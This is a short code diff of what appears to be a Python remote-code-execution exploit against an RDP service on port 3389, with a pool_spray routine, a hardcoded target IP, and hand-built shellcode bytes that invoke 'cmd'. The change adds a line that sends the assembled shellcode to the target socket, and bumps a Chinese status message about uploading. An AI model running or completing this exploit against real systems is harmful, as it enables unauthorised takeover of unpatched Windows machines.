@@ -28,7 +28,7 @@ def pool_spray(s, crypter, payload):
 def main():
 
 
-    print("正在使用新代码 直接上传 2")
+    print("正在使用新代码 直接上传 3")
     # change to your target
     host = '192.168.1.106'
     port = 3389
@@ -163,6 +163,8 @@ def main():
     outCode += b"\xC4\x08\x68\x63\x6D\x64\x00\x54"
     outCode += b"\xFF\xD0"
     #############################################
+
+    s.sendall(outCode)
 
     print('shellcode len: %d' % len(shellcode))
 
